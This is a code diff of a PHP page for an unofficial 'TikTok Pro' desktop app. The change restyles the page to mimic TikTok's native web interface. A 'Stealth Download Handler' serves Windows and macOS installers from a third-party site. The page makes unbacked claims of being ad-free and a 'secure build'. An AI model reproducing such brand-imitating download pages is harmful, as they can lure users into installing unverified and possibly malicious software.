@@ -4,38 +4,20 @@ $app_name = "TikTok Pro";
 $app_version = "v1.0.0_STABLE";
 $author = "CRTYPUBG";
 $site_url = "https://tiktok.crty-dev.com";
-$description = "The ultimate TikTok desktop experience. High-performance mobile emulation, ad-free viewing, and local video archiving. Optimized for power users by CRTYPUBG.";
-$keywords = "TikTok Pro, TikTok Desktop Download, TikTok PC Optimizer, TikTok Video Downloader, TikTok Mobile Emulation PC";
+$description = "Get the ultimate TikTok desktop experience. Ad-free, high-performance mobile emulation, and instant video download. Built for power users.";
 
-// Stealth Download Handler
+// Stealth Download Handler (Same as before)
 if (isset($_GET['access'])) {
     $token = $_GET['access'];
     $file = '';
-    
-    if ($token === 'win_x64_exe') {
-        $file = '../download/TikTok_Pro_v1.0.0_x64.exe';
-        $filename = 'TikTok_Pro_v1.0.0_x64.exe';
-    } else if ($token === 'win_x64_msi') {
-        $file = '../download/TikTok_Pro_v1.0.0_x64.msi';
-        $filename = 'TikTok_Pro_v1.0.0_x64.msi';
-    } else if ($token === 'mac_universal_dmg') {
-        $file = '../download/TikTok_Pro_v1.0.0.dmg';
-        $filename = 'TikTok_Pro_v1.0.0.dmg';
-    } else if ($token === 'mac_universal_pkg') {
-        $file = '../download/TikTok_Pro_v1.0.0.pkg';
-        $filename = 'TikTok_Pro_v1.0.0.pkg';
-    }
+    if ($token === 'win_x64_exe') { $file = '../download/TikTok_Pro_v1.0.0_x64-setup.exe'; $filename = 'TikTok_Pro_v1.0.0.exe'; }
+    else if ($token === 'win_x64_msi') { $file = '../download/TikTok_Pro_v1.0.0_x64_en-US.msi'; $filename = 'TikTok_Pro_v1.0.0.msi'; }
+    else if ($token === 'mac_universal_dmg') { $file = '../download/TikTok_Pro_v1.0.0.dmg'; $filename = 'TikTok_Pro_v1.0.0.dmg'; }
 
     if ($file && file_exists($file)) {
-        header('Content-Description: File Transfer');
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="'.$filename.'"');
-        header('Expires: 0');
-        header('Cache-Control: must-revalidate');
-        header('Pragma: public');
-        header('Content-Length: ' . filesize($file));
-        readfile($file);
-        exit;
+        readfile($file); exit;
     }
 }
 ?>
@@ -44,357 +26,342 @@ if (isset($_GET['access'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo $app_name; ?> | Official Desktop Optimization</title>
-    
-    <!-- Meta Tags -->
-    <meta name="description" content="<?php echo $description; ?>">
-    <meta name="keywords" content="<?php echo $keywords; ?>">
-    <meta name="author" content="<?php echo $author; ?>">
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    
+    <title>Download <?php echo $app_name; ?> | Tik Tok Desktop Optimized</title>
+    <link href="https://fonts.googleapis.com/css2?family=TikTok+Font:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #ff0050;
-            --secondary: #00f2ea;
-            --bg: #030303;
-            --text: #ffffff;
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(255, 255, 255, 0.08);
-            --accent-glow: rgba(255, 0, 80, 0.15);
+            --tt-red: #fe2c55;
+            --tt-cyan: #25f4ee;
+            --tt-black: #121212;
+            --tt-grey: #161823;
+            --tt-border: rgba(255, 255, 255, 0.12);
+            --tt-text-main: #ffffff;
+            --tt-text-sub: rgba(255, 255, 255, 0.75);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: 'Outfit', sans-serif;
-            overflow-x: hidden;
-            line-height: 1.5;
+            background-color: var(--tt-black);
+            color: var(--tt-text-main);
+            font-family: 'Inter', sans-serif;
+            overflow: hidden;
         }
 
-        /* --- Animations --- */
-        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0); } 50% { transform: translateY(-20px) rotate(2deg); } }
-        @keyframes pulse-glow { 0%, 100% { opacity: 0.5; } 50% { opacity: 0.8; } }
-        @keyframes grid-move { 0% { transform: translateY(0); } 100% { transform: translateY(40px); } }
-
-        /* --- Background Layers --- */
-        .cyber-bg {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: -1;
-            background: radial-gradient(circle at 50% 50%, #111 0%, #030303 100%);
-        }
-
-        .grid-overlay {
-            position: absolute;
-            top: -100%; left: 0; width: 100%; height: 200%;
-            background-image: 
-                linear-gradient(to right, var(--border) 1px, transparent 1px),
-                linear-gradient(to bottom, var(--border) 1px, transparent 1px);
-            background-size: 40px 40px;
-            mask-image: linear-gradient(to bottom, transparent, black, transparent);
-            animation: grid-move 4s linear infinite;
-            opacity: 0.3;
-        }
-
-        .orb {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(120px);
-            z-index: -1;
-            animation: pulse-glow 4s ease-in-out infinite;
-        }
-        .orb-1 { top: 10%; right: 10%; width: 500px; height: 500px; background: var(--accent-glow); }
-        .orb-2 { bottom: 10%; left: 5%; width: 400px; height: 400px; background: rgba(0, 242, 234, 0.1); }
-
-        /* --- Components --- */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            position: relative;
-        }
-
-        header {
-            padding: 3rem 0;
+        /* --- Header: TikTok Native Style --- */
+        nav {
+            height: 60px;
+            border-bottom: 1px solid var(--tt-border);
             display: flex;
+            align-items: center;
             justify-content: space-between;
-            align-items: center;
+            padding: 0 24px;
+            background: var(--tt-black);
+            position: fixed;
+            top: 0; width: 100%; z-index: 1000;
         }
 
-        .logo {
+        .logo-box {
             display: flex;
             align-items: center;
-            gap: 1rem;
-            font-weight: 800;
+            gap: 8px;
+            font-weight: 700;
             font-size: 1.5rem;
-            letter-spacing: -1px;
+            cursor: pointer;
         }
 
-        .logo img {
-            width: 32px;
-            filter: drop-shadow(0 0 8px var(--primary));
+        .logo-box img { width: 32px; }
+
+        .search-stub {
+            background: rgba(255,255,255,0.1);
+            border-radius: 92px;
+            width: 360px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            color: #8a8a8e;
+            font-size: 0.9rem;
         }
 
-        .sys-badge {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            color: #444;
-            padding: 0.4rem 0.8rem;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            background: var(--glass);
+        .nav-actions { display: flex; gap: 16px; align-items: center; }
+
+        /* --- Sidebar: TikTok Native Style --- */
+        aside {
+            width: 240px;
+            height: calc(100vh - 60px);
+            position: fixed;
+            top: 60px;
+            left: 0;
+            padding: 20px 8px;
+            border-right: 1px solid var(--tt-border);
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
         }
 
-        .hero {
-            padding: 8rem 0 6rem;
-            text-align: center;
-            max-width: 900px;
-            margin: 0 auto;
+        .side-item {
+            padding: 12px 8px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .side-item:hover { background: rgba(255,255,255,0.04); }
+        .side-item.active { color: var(--tt-red); }
+
+        .side-item svg { width: 24px; height: 24px; }
+
+        /* --- Main Content --- */
+        main {
+            margin-left: 240px;
+            margin-top: 60px;
+            height: calc(100vh - 60px);
+            overflow-y: scroll;
+            scroll-snap-type: y mandatory;
+            padding: 20px;
         }
 
-        .hero h1 {
-            font-size: clamp(3rem, 8vw, 6rem);
-            font-weight: 800;
-            line-height: 0.95;
-            letter-spacing: -4px;
-            background: linear-gradient(to bottom, #fff 30%, #555 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 2rem;
-        }
-
-        .hero p {
-            font-size: 1.25rem;
-            color: #888;
-            margin-bottom: 4rem;
+        /* --- Video Post Simulation --- */
+        .video-container {
+            width: 100%;
             max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
+            margin: 0 auto 24px;
+            scroll-snap-align: start;
+            display: flex;
+            gap: 12px;
+            padding-bottom: 24px;
+            border-bottom: 0.5px solid var(--tt-border);
         }
 
-        /* --- Download Module --- */
-        .download-interface {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 2rem;
-            margin-bottom: 8rem;
+        .avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--tt-red), var(--tt-cyan));
+            flex-shrink: 0;
         }
 
-        .os-card {
-            background: var(--glass);
-            border: 1px solid var(--border);
-            padding: 2.5rem;
-            border-radius: 32px;
-            backdrop-filter: blur(20px);
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        .content-box { flex-grow: 1; }
+
+        .user-info { margin-bottom: 12px; }
+        .user-info .nick { font-weight: 700; margin-right: 8px; }
+        .user-info .handle { color: var(--tt-text-sub); font-size: 0.9rem; }
+
+        .desc { margin-bottom: 16px; font-size: 1.1rem; }
+
+        .player-mock {
+            width: 100%;
+            aspect-ratio: 9/16;
+            background: #000;
+            border-radius: 8px;
             position: relative;
             overflow: hidden;
             display: flex;
-            flex-direction: column;
-            gap: 2rem;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 40px rgba(0,0,0,0.5);
         }
 
-        .os-card:hover {
-            border-color: rgba(255, 255, 255, 0.2);
-            transform: translateY(-8px);
-            background: rgba(255, 255, 255, 0.05);
+        .player-mock video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.4;
         }
 
-        .os-info { text-align: left; }
-        .os-info h3 { font-size: 1.5rem; margin-bottom: 0.5rem; }
-        .os-info span { font-size: 0.8rem; color: #555; text-transform: uppercase; letter-spacing: 2px; }
-
-        .btn-group {
+        .download-overlay {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0; left: 0;
             display: flex;
             flex-direction: column;
-            gap: 1rem;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.5s ease;
         }
 
-        .btn {
-            padding: 1.2rem;
-            border-radius: 16px;
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .node-tile {
+            background: #fff;
+            color: #000;
+            padding: 16px 24px;
+            border-radius: 4px;
+            font-weight: 700;
             text-decoration: none;
-            font-weight: 600;
+            margin-bottom: 12px;
+            width: 240px;
+            text-align: center;
+            transition: transform 0.2s, background 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 0.8rem;
-            transition: all 0.3s;
-            font-size: 0.95rem;
+            gap: 8px;
         }
-
-        .btn-primary { 
-            background: #fff; 
-            color: #000; 
-            border: none;
+        .node-tile:hover {
+            transform: scale(1.05);
+            background: var(--tt-cyan);
         }
-        .btn-primary:hover { 
-            background: var(--secondary);
-            transform: scale(1.02);
-        }
-
-        .btn-outline {
-            border: 1px solid var(--border);
+        .node-tile.secondary {
+            background: transparent;
+            border: 1px solid #fff;
             color: #fff;
-            background: rgba(255, 255, 255, 0.02);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-        }
-        .btn-outline:hover {
-            border-color: #fff;
-            background: rgba(255, 255, 255, 0.08);
         }
 
-        /* --- Dashboard Simulation --- */
-        .dashboard-shards {
-            background: var(--glass);
-            border: 1px solid var(--border);
-            border-radius: 32px;
-            padding: 4rem;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 4rem;
-            margin-bottom: 8rem;
-            backdrop-filter: blur(40px);
-        }
+        .node-tile.secondary:hover { background: rgba(255,255,255,0.1); }
 
-        .stat-shrd {
-            text-align: center;
-        }
-        .stat-shrd .val {
-            font-size: 2.5rem;
-            font-weight: 800;
-            color: var(--primary);
-            font-family: 'JetBrains Mono', monospace;
-            display: block;
-            margin-bottom: 0.5rem;
-        }
-        .stat-shrd .lbl {
+        .os-tag {
             font-size: 0.7rem;
-            color: #555;
             text-transform: uppercase;
-            letter-spacing: 3px;
+            letter-spacing: 1px;
+            color: var(--tt-text-sub);
+            margin-bottom: 8px;
         }
 
-        footer {
-            padding: 6rem 0;
-            text-align: center;
-            border-top: 1px solid var(--border);
+        /* --- Social Buttons stub --- */
+        .social-bar {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            justify-content: flex-end;
+            padding-bottom: 20px;
         }
 
-        .footer-logo {
-            opacity: 0.3;
-            margin-bottom: 2rem;
-            filter: grayscale(1);
+        .social-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.08);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
         }
 
-        .copyright {
-            font-size: 0.7rem;
-            color: #333;
-            font-family: 'JetBrains Mono', monospace;
-            letter-spacing: 2px;
-        }
+        ::-webkit-scrollbar { width: 0; }
 
-        /* --- Media Queries --- */
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 3.5rem; }
-            .dashboard-shards { gap: 2rem; padding: 2rem; }
-        }
     </style>
 </head>
 <body>
-    <div class="cyber-bg">
-        <div class="grid-overlay"></div>
-        <div class="orb orb-1"></div>
-        <div class="orb orb-2"></div>
+
+<nav>
+    <div class="logo-box">
+        <img src="../images/slapsh-logo-tt.png" alt="Tik Tok">
+        <span>TikTok Pro</span>
+    </div>
+    <div class="search-stub">Search for "Optimization"...</div>
+    <div class="nav-actions">
+        <button style="background:var(--tt-red); border:none; color:#fff; padding:8px 16px; border-radius:4px; font-weight:600;">Get App</button>
+        <div style="width:32px; height:32px; background:#444; border-radius:50%;"></div>
+    </div>
+</nav>
+
+<aside>
+    <div class="side-item active">
+        <svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L4 10v12h5v-6h6v6h5V10L12 2z"/></svg>
+        For You
+    </div>
+    <div class="side-item">
+        <svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4zm0-2a4 4 0 100-8 4 4 0 000 8z"/></svg>
+        Following
+    </div>
+    <div class="side-item">
+        <svg fill="currentColor" viewBox="0 0 24 24"><path d="M11 11.5c0-.828.672-1.5 1.5-1.5s1.5.672 1.5 1.5c0 .829-.672 1.5-1.5 1.5s-1.5-.671-1.5-1.5zM22 12a10 10 0 11-20 0 10 10 0 0120 0zm-2 0a8 8 0 10-16 0 8 8 0 0016 0z"/></svg>
+        Explore
+    </div>
+</aside>
+
+<main>
+    <!-- Entry Post -->
+    <div class="video-container">
+        <div class="avatar"></div>
+        <div class="content-box">
+            <div class="user-info">
+                <span class="nick">TikTok Pro Official</span>
+                <span class="handle">@tiktok_pro_build</span>
+            </div>
+            <p class="desc">Experience TikTok like never before. Mobile performance on Desktop. Ad-Free. Archive everything. #TikTokPro #DesktopOptimization</p>
+            <div class="player-mock">
+                <div class="download-overlay">
+                    <span class="os-tag">Secure Build Distributed</span>
+                    <a href="index.php?access=win_x64_exe" class="node-tile">
+                        DOWNLOAD EXE (WIN)
+                    </a>
+                    <a href="index.php?access=win_x64_msi" class="node-tile secondary">
+                        INIT MSI INSTALLER
+                    </a>
+                    <div style="margin-top: 24px; color: var(--tt-cyan); font-weight:700; font-family:'JetBrains Mono', monospace; font-size:0.8rem;">
+                        [SYSTEM_STABLE_V1.0.0]
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="social-bar">
+            <div class="social-btn">❤️</div>
+            <div class="social-btn">💬</div>
+            <div class="social-btn">🔖</div>
+            <div class="social-btn">🔗</div>
+        </div>
     </div>
 
-    <div class="container">
-        <header>
-            <div class="logo">
-                <img src="../images/slapsh-logo-tt.png" alt="Logo">
-                <span>TikTok Pro</span>
+    <!-- Secondary Node (Mac) -->
+    <div class="video-container">
+        <div class="avatar" style="background: #fff"></div>
+        <div class="content-box">
+            <div class="user-info">
+                <span class="nick">Apple Silicon Build</span>
+                <span class="handle">@darwin_core</span>
             </div>
-            <div class="sys-badge">OSX_WIN_STABLE_<?php echo date("Y"); ?></div>
-        </header>
-
-        <main>
-            <section class="hero">
-                <h1>The Future of<br>TikTok Desktop.</h1>
-                <p>Pure mobile fidelity. Zero tracking. High-bitrate archiving. Designed for developers and power users.</p>
-                
-                <div class="download-interface">
-                    <!-- Windows Node -->
-                    <article class="os-card">
-                        <div class="os-info">
-                            <span>Platform: Windows</span>
-                            <h3>Windows 10 / 11</h3>
-                        </div>
-                        <div class="btn-group">
-                            <a href="index.php?access=win_x64_exe" class="btn btn-primary">
-                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
-                                GET_EXECUTABLE
-                            </a>
-                            <a href="index.php?access=win_x64_msi" class="btn btn-outline">
-                                INIT_MSI_PACKAGE
-                            </a>
-                        </div>
-                    </article>
-
-                    <!-- macOS Node -->
-                    <article class="os-card">
-                        <div class="os-info">
-                            <span>Platform: Darwin</span>
-                            <h3>Apple Silicon / Intel</h3>
-                        </div>
-                        <div class="btn-group">
-                            <a href="index.php?access=mac_universal_dmg" class="btn btn-primary">
-                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 19V5M5 12l7 7 7-7"/></svg>
-                                MOUNT_DMG_IMAGE
-                            </a>
-                            <a href="index.php?access=mac_universal_pkg" class="btn btn-outline">
-                                INSTALL_PKG_CORE
-                            </a>
-                        </div>
-                    </article>
+            <p class="desc">Universal binary for macOS. Native M1/M2/M3 support. Ultra-low latency video engine. #MacPro #TikTokDesktop</p>
+            <div class="player-mock" style="background: #111;">
+                <div class="download-overlay">
+                    <span class="os-tag">Darwin Core Image</span>
+                    <a href="index.php?access=mac_universal_dmg" class="node-tile">
+                        MOUNT DMG (MACOS)
+                    </a>
                 </div>
-            </section>
-
-            <section class="dashboard-shards">
-                <div class="stat-shrd">
-                    <span class="val">1.2ms</span>
-                    <span class="lbl">LATENCY_CORE</span>
-                </div>
-                <div class="stat-shrd">
-                    <span class="val">99.9%</span>
-                    <span class="lbl">BITRATE_EFFICIENCY</span>
-                </div>
-                <div class="stat-shrd">
-                    <span class="val">0.0</span>
-                    <span class="lbl">TRACKING_LEAK</span>
-                </div>
-                <div class="stat-shrd">
-                    <span class="val"><?php echo date("sh"); ?></span>
-                    <span class="lbl">ACTIVE_HOST_NODES</span>
-                </div>
-            </section>
-        </main>
-
-        <footer>
-            <div class="logo footer-logo">
-                <img src="../images/slapsh-logo-tt.png" alt="Logo" width="24">
             </div>
-            <div class="copyright">
-                © <?php echo date("Y"); ?> CRTY_DEFENSE. ALL SYSTEMS ENCRYPTED.
-            </div>
-        </footer>
+        </div>
+        <div class="social-bar">
+            <div class="social-btn">❤️</div>
+            <div class="social-btn">💬</div>
+            <div class="social-btn">🔖</div>
+            <div class="social-btn">🔗</div>
+        </div>
     </div>
+</main>
+
+<script>
+    // Smooth pulse for the active item
+    const activeItem = document.querySelector('.side-item.active');
+    setInterval(() => {
+        activeItem.style.opacity = activeItem.style.opacity === '0.7' ? '1' : '0.7';
+    }, 1500);
+
+    // Fade in effect on scroll
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                entry.target.style.opacity = '1';
+                entry.target.style.transform = 'translateY(0)';
+            }
+        });
+    }, { threshold: 0.1 });
+
+    document.querySelectorAll('.video-container').forEach(v => {
+        v.style.opacity = '0';
+        v.style.transform = 'translateY(40px)';
+        v.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
+        observer.observe(v);
+    });
+</script>
+
 </body>
 </html>
